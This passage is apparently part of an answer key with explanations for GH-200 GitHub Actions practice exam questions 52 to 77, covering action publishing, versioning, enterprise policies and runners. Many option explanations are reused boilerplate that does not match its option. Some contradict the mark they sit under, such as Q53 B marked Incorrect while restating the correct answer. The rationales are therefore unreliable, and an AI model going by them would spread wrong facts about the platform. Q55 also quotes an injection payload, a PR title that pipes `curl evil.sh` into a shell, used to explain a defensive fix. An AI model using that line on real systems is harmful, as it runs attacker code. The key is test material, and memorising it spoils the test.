- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Correct. Every JavaScript, Docker, and Composite custom action requires a valid `action.yml` / `action.yaml` metadata file defining its interface and runtime.

### Question 53 — `C` (Author and maintain actions)

Correct answer: C (is correct). No — GitHub Marketplace requires a `Public` single-action repository with `action.yml` (`or action.yaml`) located at the repository root; subfolder multi-action repositories must be split into standalone public repos to list on Marketplace. [Skill 3.4: Define action metadata, inputs, outputs, and branding in action configuration files | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions)]

- **A:** Incorrect. Every JavaScript, Docker, and Composite custom action requires a valid `action.yml` / `action.yaml` metadata file defining its interface and runtime.
- **B:** Incorrect. The proposed workflow or action configuration violates at least one stated GitHub Actions execution, security, or governance rule. No — GitHub Marketplace requires a `Public` single-action repository with `action.yml` (`or action.yaml`) located at the repository root; subfolder multi-action repositories must be split into standalone public repos to list on Marketplace.
- **C:** Correct. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.
- **D:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.

### Question 54 — `A, B, D` (Author and maintain actions)

Correct answers: A, B, and D (are correct). A Docker action can reference `runs.image: 'Dockerfile'` (`built per job`) OR a prebuilt registry image `runs.image: 'docker://ghcr.io/org/tool@sha256:...'` (`faster startup`); `node20` actions point `runs.main` to bundled `dist/index.js`; and Composite actions declare `runs.using: 'composite'` with `shell:` on every `run:` step. [Skill 3.4: Define action metadata, inputs, outputs, and branding in action configuration files | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions)]

- **A:** Correct. Every JavaScript, Docker, and Composite custom action requires a valid `action.yml` / `action.yaml` metadata file defining its interface and runtime.
- **B:** Correct. Composite actions require explicit `shell:` on every `run:` step and locate files inside the action repo via `github.action_path`.
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Correct. Bundling dependencies into committed `dist/index.js` makes JavaScript actions self-contained and fast across Linux, Windows, and macOS.
- **E:** Incorrect. Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.
- **F:** Incorrect. Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.

### Question 55 — `C` (Author and maintain actions)

Correct answer: C (is correct). `core.setOutput('ticket_payload', jsonStr)` safely writes single- or multi-line outputs to `$GITHUB_OUTPUT` using a randomized heredoc delimiter, and `core.warning(msg, AnnotationProperties)` emits structured file/line annotations. [Skill 3.5: Implement workflow commands, exit codes, and output handling within actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/setting-exit-codes-for-actions)]

- **A:** Incorrect. Raw `${{ ... }}` expands before shell parsing so an attacker PR title like `"; curl evil.sh | sh #` executes arbitrary code; pass via `env:` (`TITLE: ${{ ... }}`) and quote `"$TITLE"`.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Correct. `@actions/core` safely escapes multiline environment file values, masks secrets via `setSecret()`, and passes state between `pre:` -> `main:` -> `post:` scripts via `saveState`/`getState`.
- **D:** Incorrect. `on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.

### Question 56 — `A` (Author and maintain actions)

Correct answer: A (is correct). Any non-zero shell exit code (`echo "::error title=Vuln Gate::Critical CVEs found" && exit 1`, with `set -eo pipefail` default in `shell: bash`) immediately fails the composite action and surfaces the `::error` annotation on the PR Checks tab. [Skill 3.5: Implement workflow commands, exit codes, and output handling within actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/setting-exit-codes-for-actions)]

- **A:** Correct. `@actions/core` safely escapes multiline environment file values, masks secrets via `setSecret()`, and passes state between `pre:` -> `main:` -> `post:` scripts via `saveState`/`getState`.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.

### Question 57 — `A` (Author and maintain actions)

Correct answer: A (is correct). Either mirror/sync curated upstream action repositories onto an internal GHES organization (`referencing internal org/action@<sha>`) or configure controlled GitHub Connect automatic action downloads with strict Enterprise allowed-actions policies. [Skill 3.6: Select an appropriate distribution model for public, private, and enterprise actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/sharing-actions-and-workflows-from-your-private-repository)]

- **A:** Correct. Enterprise teams can share private/internal actions across organizations without publishing proprietary code to the public internet or GitHub Marketplace.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Incorrect. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.
- **D:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 58 — `C` (Author and maintain actions)

Correct answer: C (is correct). Yes — outside GitHub Marketplace (`which requires a single root action.yml`), GitHub Actions natively supports referencing subfolder actions via `uses: heliosgrid/ci-actions/rust/clippy@<40-char-sha>` once repository `Actions -> General -> Access` sharing is enabled. [Skill 3.6: Select an appropriate distribution model for public, private, and enterprise actions | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/sharing-actions-and-workflows-from-your-private-repository)]

- **A:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **B:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **C:** Correct. Enterprise teams can share private/internal actions across organizations without publishing proprietary code to the public internet or GitHub Marketplace.
- **D:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.

### Question 59 — `B` (Author and maintain actions)

Correct answer: B (is correct). From the GitHub Release page (`or Marketplace listing settings`) of the public action repository, maintainers can uncheck `Publish this Action to the GitHub Marketplace` / delist the action release without deleting the underlying repository or breaking existing Git SHA pins. [Skill 3.7: Publish actions to GitHub Marketplace | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/publishing-actions-in-github-marketplace)]

- **A:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **B:** Correct. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **C:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **D:** Incorrect. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.

### Question 60 — `C` (Author and maintain actions)

Correct answer: C (is correct). Creating a `Public` single-action repo with root `action.yml`, adding unique `name`/`description`/`README`/`branding`, enabling `2FA` + accepting the Marketplace Developer Agreement, and publishing a `v1.0.0` Release (`Publish to Marketplace`) lists the action cleanly. [Skill 3.7: Publish actions to GitHub Marketplace | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/publishing-actions-in-github-marketplace)]

- **A:** Incorrect. Marketplace enforces globally unique action `name` metadata and root `action.yml` validation inside the Release UI.
- **B:** Incorrect. EMU accounts cannot publish public repos on `github.com`, and `description`/`runs` + SemVer version tags are mandatory.
- **C:** Correct. GitHub Marketplace requires a public single-action repo with root `action.yml`, complete branding/docs, `2FA`, and a SemVer GitHub Release.
- **D:** Incorrect. Private/Internal repos and multi-action monorepos cannot publish directly to GitHub Marketplace, and Releases + `2FA` are required.

### Question 61 — `C` (Author and maintain actions)

Correct answer: C (is correct). Cut new major release `v2.0.0` (`and create floating major tag v2`), leaving `v1` pointing to the latest `v1.x.x` commit so existing `@v1` workflows are not broken by incompatible input changes. [Skill 3.8: Create and manage action releases, tags, and versioning strategies for consumers | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/releasing-and-maintaining-actions)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **B:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **C:** Correct. Maintaining SemVer tags (`v1.2.0`), sliding major tags (`v1`), and full 40-character SHA references (`Dependabot updates both SHA and comment`) balances ergonomics and supply-chain safety.
- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.

### Question 62 — `D, E` (Author and maintain actions)

Correct answers: D and E (are correct). Publish immutable SemVer releases (`v2.3.1`) backed by Immutable Actions (`GHCR` OCI packages), and document full 40-character commit SHA examples (`uses: org/action@<40-char-sha> # v2.3.1`) paired with Dependabot `github-actions` updates so consumers stay current safely. [Skill 3.8: Create and manage action releases, tags, and versioning strategies for consumers | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/actions/sharing-automations/creating-actions/releasing-and-maintaining-actions)]

- **A:** Incorrect. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **D:** Correct. Maintaining SemVer tags (`v1.2.0`), sliding major tags (`v1`), and full 40-character SHA references (`Dependabot updates both SHA and comment`) balances ergonomics and supply-chain safety.
- **E:** Correct. Combining immutable SemVer releases, major `v1` convenience tags, and 40-char SHA pinning follows GitHub official action release guidance.
- **F:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.

### Question 63 — `C` (Manage GitHub Actions for the enterprise)

Correct answer: C (is correct). Organization Repository Rulesets can target repositories dynamically by custom property (`grid_criticality = NERC-CIP`) and enforce `Require workflows to pass before merging` pointing to `heliosgrid/sec-ci/.github/workflows/nerc-scan.yml`. [Skill 4.1: Configure and govern enterprise-level reuse of actions and reusable workflows | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/reusing-workflows)]

- **A:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Correct. Reusable workflows let teams opt into shared jobs, whereas Repository Ruleset Required Workflows enforce un-editable governance checks automatically across matching repos.
- **D:** Incorrect. Starter templates only scaffold initial file creation; centrally updating CI logic across 100 repos requires a Reusable Workflow (`on: workflow_call`) or Required Workflow.

### Question 64 — `B` (Manage GitHub Actions for the enterprise)

Correct answer: B (is correct). Host golden reusable workflows in a dedicated `Internal` repository protected by branch/tag Rulesets (`requiring 2 CODEOWNERS approvals, signed commits, status checks, and tag creation locks`) and require consumers to pin releases by 40-char SHA or protected tag. [Skill 4.1: Configure and govern enterprise-level reuse of actions and reusable workflows | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/reusing-workflows)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Correct. Reusable workflows let teams opt into shared jobs, whereas Repository Ruleset Required Workflows enforce un-editable governance checks automatically across matching repos.
- **C:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **D:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.

### Question 65 — `B` (Manage GitHub Actions for the enterprise)

Correct answer: B (is correct). A called `workflow_call` workflow executes inside the CALLER repository's run context: runner minutes, concurrency limits, `github.repository`, and `GITHUB_TOKEN` permissions all belong to the caller repository (`not heliosgrid/ci-templates`). [Skill 4.1: Configure and govern enterprise-level reuse of actions and reusable workflows | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/reusing-workflows)]

- **A:** Incorrect. Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.
- **B:** Correct. Reusable workflows let teams opt into shared jobs, whereas Repository Ruleset Required Workflows enforce un-editable governance checks automatically across matching repos.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!

### Question 66 — `D` (Manage GitHub Actions for the enterprise)

Correct answer: D (is correct). Yes — on GitHub Enterprise Cloud (`and GHES`), BOTH `Private` and `Internal` repositories offer `Access` sharing levels (`Not accessible`, `Accessible from repositories in the '<org>' organization`, or `Accessible from repositories in the '<enterprise>' enterprise`), though `Public` repos remain excluded. [Skill 4.2: Control access and sharing policies for actions and workflows across repositories and organizations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/creating-actions/sharing-actions-and-workflows-with-your-enterprise)]

- **A:** Incorrect. Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Incorrect. Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.
- **D:** Correct. Even on an `Internal` repository, sibling organizations cannot invoke its `workflow_call` or actions until `Actions -> General -> Access` explicitly enables enterprise/org sharing.

### Question 67 — `A` (Manage GitHub Actions for the enterprise)

Correct answer: A (is correct). No — Enterprise-level Actions policies establish the ceiling; when an Enterprise Owner disables Actions for an organization (`or enforces strict allowed-actions / Fork PR / GITHUB_TOKEN policies`), Organization and Repository admins cannot relax that restriction. [Skill 4.2: Control access and sharing policies for actions and workflows across repositories and organizations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/creating-actions/sharing-actions-and-workflows-with-your-enterprise)]

- **A:** Correct. Even on an `Internal` repository, sibling organizations cannot invoke its `workflow_call` or actions until `Actions -> General -> Access` explicitly enables enterprise/org sharing.
- **B:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **C:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.

### Question 68 — `B` (Manage GitHub Actions for the enterprise)

Correct answer: B (is correct). The organization/repository setting `Allow GitHub Actions to create and approve pull requests` is disabled by default so compromised workflows cannot bypass human branch-protection `Required approvals` by self-approving PRs with `GITHUB_TOKEN`. [Skill 4.2: Control access and sharing policies for actions and workflows across repositories and organizations | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/sharing-automations/creating-actions/sharing-actions-and-workflows-with-your-enterprise)]

- **A:** Incorrect. GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.
- **B:** Correct. Even on an `Internal` repository, sibling organizations cannot invoke its `workflow_call` or actions until `Actions -> General -> Access` explicitly enables enterprise/org sharing.
- **C:** Incorrect. Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!
- **D:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 69 — `A` (Manage GitHub Actions for the enterprise)

Correct answer: A (is correct). Workflows can execute any action/reusable workflow owned by organization `heliosgrid`, any official action in `actions/*` (`and github/*` via `Allow actions created by GitHub`), and any action under `aws-actions/*`, while all other third-party namespaces are blocked at run startup. [Skill 4.3: Enforce enterprise and organization policies for allowed actions and workflow execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/enforcing-policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise)]

- **A:** Correct. Enterprise/Org Actions policies block unvetted Marketplace code, reject mutable `@v1`/`@main` tags when full-SHA pinning is required, and gate external fork PR runs.
- **B:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.

### Question 70 — `A` (Manage GitHub Actions for the enterprise)

Correct answer: A (is correct). Under `Settings -> Actions -> General -> Fork pull request workflows in private repositories`, keep `Run workflows from fork pull requests` UNCHECKED (`or enable Require approval for fork pull request workflows` and keep `Send secrets and variables to workflows from fork pull requests` UNCHECKED). [Skill 4.3: Enforce enterprise and organization policies for allowed actions and workflow execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/enforcing-policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise)]

- **A:** Correct. Enterprise/Org Actions policies block unvetted Marketplace code, reject mutable `@v1`/`@main` tags when full-SHA pinning is required, and gate external fork PR runs.
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Incorrect. Never checkout and build untrusted fork `pull_request.head.sha` inside `pull_request_target`; run untrusted tests in unprivileged `on: pull_request` instead.
- **D:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.

### Question 71 — `A, C, D` (Manage GitHub Actions for the enterprise)

Correct answers: A, C, and D (are correct). Enable Enterprise `Allow select actions and reusable workflows` (`curated namespaces only`), check `Require actions to be pinned to a full-length commit SHA`, and enforce central security scans via Organization/Enterprise Repository Ruleset `Require workflows to pass before merging`. [Skill 4.3: Enforce enterprise and organization policies for allowed actions and workflow execution | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/enforcing-policies/enforcing-policies-for-your-enterprise/enforcing-policies-for-github-actions-in-your-enterprise)]

- **A:** Correct. Enterprise/Org Actions policies block unvetted Marketplace code, reject mutable `@v1`/`@main` tags when full-SHA pinning is required, and gate external fork PR runs.
- **B:** Incorrect. Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.
- **C:** Correct. Full 40-character SHA pinning + Immutable Actions prevent upstream tag hijacking, while Sigstore-backed Artifact Attestations prove cryptographic build provenance at deploy time.
- **D:** Correct. Reusable workflows let teams opt into shared jobs, whereas Repository Ruleset Required Workflows enforce un-editable governance checks automatically across matching repos.
- **E:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.
- **F:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.

### Question 72 — `A` (Manage GitHub Actions for the enterprise)

Correct answer: A (is correct). ARC `gha-runner-scale-set` supports `containerMode.type: "dind"` (`isolated Docker-in-Docker sidecar daemon per ephemeral runner pod`) and `containerMode.type: "kubernetes"` (`running job containers as sibling K8s pods via container hooks`, or rootless Kaniko/BuildKit). [Skill 4.4: Plan, deploy, and scale GitHub-hosted and self-hosted runners (including ephemeral and Kubernetes-based runners) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/using-github-hosted-runners/using-larger-runners/about-larger-runners)]

- **A:** Correct. Ephemeral single-job runners (`hosted`, `--ephemeral`, `JIT`, or `ARC` scale-set pods authenticated via GitHub App) eliminate cross-job workspace contamination.
- **B:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **C:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **D:** Incorrect. `node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.

### Question 73 — `B` (Manage GitHub Actions for the enterprise)

Correct answer: B (is correct). `POST /orgs/{org}/actions/runners/generate-jitconfig` (`with name, runner_group_id, labels, and work_folder`) mints a single-use encrypted JIT configuration blob passed directly to `./run.sh --jitconfig` so the runner executes exactly one job and auto-deregisters. [Skill 4.4: Plan, deploy, and scale GitHub-hosted and self-hosted runners (including ephemeral and Kubernetes-based runners) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/using-github-hosted-runners/using-larger-runners/about-larger-runners)]

- **A:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **B:** Correct. Ephemeral single-job runners (`hosted`, `--ephemeral`, `JIT`, or `ARC` scale-set pods authenticated via GitHub App) eliminate cross-job workspace contamination.
- **C:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
- **D:** Incorrect. `actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!

### Question 74 — `D` (Manage GitHub Actions for the enterprise)

Correct answer: D (is correct). Creating an org GitHub App + K8s Secret, scoping a Runner Group (`no Public repos`), deploying `gha-runner-scale-set-controller` + `gha-runner-scale-set` (`minRunners: 0`), and opening egress to `github.com`, `*.actions.githubusercontent.com`, and `ghcr.io` establishes production ARC scaling. [Skill 4.4: Plan, deploy, and scale GitHub-hosted and self-hosted runners (including ephemeral and Kubernetes-based runners) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/actions/using-github-hosted-runners/using-larger-runners/about-larger-runners)]

- **A:** Incorrect. Personal PATs share a 5,000/hr cap, public repos expose internal clusters to fork PR attacks, and blocking `ghcr.io` breaks Immutable Actions.
- **B:** Incorrect. Cloning `.runner` identity files triggers session conflicts; ARC mints fresh JIT runner configs per pod.
- **C:** Incorrect. Legacy webhook ARC is deprecated; GA `gha-runner-scale-set` uses outbound long-polling and ephemeral single-job pods.
- **D:** Correct. GA ARC pairs `gha-runner-scale-set` + GitHub App auth inside a restricted Runner Group with Immutable Actions (`ghcr.io`) egress.

### Question 75 — `D` (Manage GitHub Actions for the enterprise)

Correct answer: D (is correct). GitHub-hosted Azure Private Networking (`VNet integration`) is supported ONLY for Linux (`x64`/`arm64`) and Windows (`x64`) Larger runners; macOS GitHub-hosted and Larger runners do NOT support Azure VNet injection (`requiring self-hosted macOS hosts or static IP / WireGuard / OIDC API gateways`). [Skill 4.5: Configure runner networking, IP allow lists, proxies, and private networking (including Azure VNet integration) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/configuring-settings/configuring-private-networking-for-hosted-compute-products/about-azure-private-networking-for-github-hosted-runners-in-your-enterprise)]

- **A:** Incorrect. Immutable Actions distribute OCI action packages from `ghcr.io` / `pkg.actions.githubusercontent.com`; blocking those hosts breaks action downloads during job setup!
- **B:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **C:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **D:** Correct. Azure Private Networking injects Linux/Windows Larger runners into private subnets (`not arm64 macOS`), and firewall allowlists must permit `*.actions.githubusercontent.com` + `ghcr.io` for Immutable Actions.

### Question 76 — `C, D` (Manage GitHub Actions for the enterprise)

Correct answers: C and D (are correct). Delegate a dedicated Azure subnet exclusively to `Microsoft.Network/virtualNetworks/subnets` service delegation `GitHub.Network/networkSettings` (`registering the GitHub.Network resource provider`), and attach the resulting GitHub Enterprise network configuration to a Runner Group containing Linux/Windows Larger runners. [Skill 4.5: Configure runner networking, IP allow lists, proxies, and private networking (including Azure VNet integration) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/configuring-settings/configuring-private-networking-for-hosted-compute-products/about-azure-private-networking-for-github-hosted-runners-in-your-enterprise)]

- **A:** Incorrect. Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.
- **B:** Incorrect. Immutable Actions distribute OCI action packages from `ghcr.io` / `pkg.actions.githubusercontent.com`; blocking those hosts breaks action downloads during job setup!
- **C:** Correct. Linux/Windows Larger runners join Azure VNets via `NetworkSettings`, and egress allowlists must include `pkg.actions.githubusercontent.com` + `ghcr.io` for Immutable Actions.
- **D:** Correct. Azure Private Networking injects Linux/Windows Larger runners into private subnets (`not arm64 macOS`), and firewall allowlists must permit `*.actions.githubusercontent.com` + `ghcr.io` for Immutable Actions.
- **E:** Incorrect. Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.
- **F:** Incorrect. Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.

### Question 77 — `D` (Manage GitHub Actions for the enterprise)

Correct answer: D (is correct). Exporting `NODE_EXTRA_CA_CERTS=/etc/ssl/certs/substation-root.pem` (`alongside OS trust store update-ca-certificates`) in the runner `.env` file configures the bundled Node.js runtime used by JavaScript actions (`such as actions/checkout`) to trust the custom enterprise CA. [Skill 4.5: Configure runner networking, IP allow lists, proxies, and private networking (including Azure VNet integration) | Study Guide: https://learn.microsoft.com/en-us/credentials/certifications/resources/study-guides/gh-200 | Reference: GitHub Actions Documentation (https://docs.github.com/en/enterprise-cloud@latest/admin/configuring-settings/configuring-private-networking-for-hosted-compute-products/about-azure-private-networking-for-github-hosted-runners-in-your-enterprise)]

- **A:** Incorrect. `::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.
